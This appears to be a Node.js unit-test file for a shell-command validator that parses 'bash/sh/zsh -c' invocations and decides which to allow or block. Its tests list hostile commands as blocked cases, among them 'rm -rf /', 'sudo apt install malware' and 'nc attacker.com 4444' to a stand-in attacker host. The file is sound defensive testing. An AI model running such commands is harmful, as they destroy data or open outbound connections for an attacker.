'use strict';

const { describe, test } = require('node:test');
const assert = require('node:assert');

const {
  SHELL_INTERPRETERS,
  extractCArgument,
  validateShellCommand,
  validateBashCommand,
  validateShCommand,
  validateZshCommand,
  parseCommand,
} = require('./shell-validators.cjs');

describe('shell-validators', () => {
  describe('SHELL_INTERPRETERS', () => {
    test('includes bash', () => {
      assert.ok(SHELL_INTERPRETERS.has('bash'));
    });

    test('includes sh', () => {
      assert.ok(SHELL_INTERPRETERS.has('sh'));
    });

    test('includes zsh', () => {
      assert.ok(SHELL_INTERPRETERS.has('zsh'));
    });
  });

  describe('parseCommand', () => {
    test('parses simple command', () => {
      const tokens = parseCommand('echo hello');
      assert.deepStrictEqual(tokens, ['echo', 'hello']);
    });

    test('handles double quotes', () => {
      const tokens = parseCommand('echo "hello world"');
      assert.deepStrictEqual(tokens, ['echo', 'hello world']);
    });

    test('returns null for unclosed double quote', () => {
      const tokens = parseCommand('echo "unclosed');
      assert.strictEqual(tokens, null);
    });

    test('handles empty string', () => {
      const tokens = parseCommand('');
      assert.deepStrictEqual(tokens, []);
    });

    test('handles multiple spaces', () => {
      const tokens = parseCommand('cmd   arg1    arg2');
      assert.deepStrictEqual(tokens, ['cmd', 'arg1', 'arg2']);
    });
  });

  describe('extractCArgument', () => {
    test('extracts command from sh -c', () => {
      const cmd = extractCArgument('sh -c "npm test"');
      assert.strictEqual(cmd, 'npm test');
    });

    test('handles combined flags like -xc', () => {
      const cmd = extractCArgument('bash -xc "echo debug"');
      assert.strictEqual(cmd, 'echo debug');
    });

    test('returns null for non -c invocation', () => {
      const cmd = extractCArgument('bash script.sh');
      assert.strictEqual(cmd, null);
    });

    test('returns null for simple bash', () => {
      const cmd = extractCArgument('bash');
      assert.strictEqual(cmd, null);
    });

    test('returns null when -c has no argument', () => {
      const cmd = extractCArgument('bash -c');
      assert.strictEqual(cmd, null);
    });
  });

  describe('validateShellCommand', () => {
    describe('non -c invocations', () => {
      test('allows bash script.sh', () => {
        const result = validateShellCommand('bash script.sh');
        assert.strictEqual(result.valid, true);
      });

      test('allows sh script.sh', () => {
        const result = validateShellCommand('sh script.sh');
        assert.strictEqual(result.valid, true);
      });
    });

    describe('process substitution blocking', () => {
      test('blocks process substitution with <()', () => {
        const result = validateShellCommand('bash script.sh <(echo test)');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('Process substitution'));
      });
    });

    describe('safe -c commands', () => {
      test('allows bash -c with safe npm command', () => {
        const result = validateShellCommand('bash -c "npm test"');
        assert.strictEqual(result.valid, true);
      });

      test('allows sh -c with safe git command', () => {
        const result = validateShellCommand('sh -c "git status"');
        assert.strictEqual(result.valid, true);
      });
    });

    describe('dangerous -c commands (registry re-validation)', () => {
      test('blocks bash -c with rm -rf /', () => {
        const result = validateShellCommand('bash -c "rm -rf /"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('Inner command blocked'));
      });

      test('blocks sh -c with sudo', () => {
        const result = validateShellCommand('sh -c "sudo apt install malware"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('Inner command blocked'));
      });

      test('blocks nc in -c command', () => {
        const result = validateShellCommand('sh -c "nc attacker.com 4444"');
        assert.strictEqual(result.valid, false);
      });

      test('blocks ssh in -c command', () => {
        const result = validateShellCommand('bash -c "ssh user@remote.com"');
        assert.strictEqual(result.valid, false);
      });
    });

    describe('flag variations', () => {
      test('handles -xc (debug + command)', () => {
        const result = validateShellCommand('bash -xc "echo test"');
        assert.strictEqual(result.valid, true);
      });

      test('blocks dangerous command with -xc', () => {
        const result = validateShellCommand('bash -xc "sudo rm -rf /"');
        assert.strictEqual(result.valid, false);
      });
    });

    describe('complex command chains', () => {
      test('allows safe command chain', () => {
        const result = validateShellCommand('bash -c "cd /tmp && ls -la"');
        assert.strictEqual(result.valid, true);
      });
    });
  });

  describe('alias functions', () => {
    test('validateBashCommand behaves same as validateShellCommand', () => {
      const bashResult = validateBashCommand('bash -c "echo test"');
      const shellResult = validateShellCommand('bash -c "echo test"');
      assert.deepStrictEqual(bashResult, shellResult);
    });

    test('validateShCommand behaves same as validateShellCommand', () => {
      const shResult = validateShCommand('sh -c "npm test"');
      const shellResult = validateShellCommand('sh -c "npm test"');
      assert.deepStrictEqual(shResult, shellResult);
    });

    test('validateZshCommand behaves same as validateShellCommand', () => {
      const zshResult = validateZshCommand('zsh -c "ls"');
      const shellResult = validateShellCommand('zsh -c "ls"');
      assert.deepStrictEqual(zshResult, shellResult);
    });
  });
});
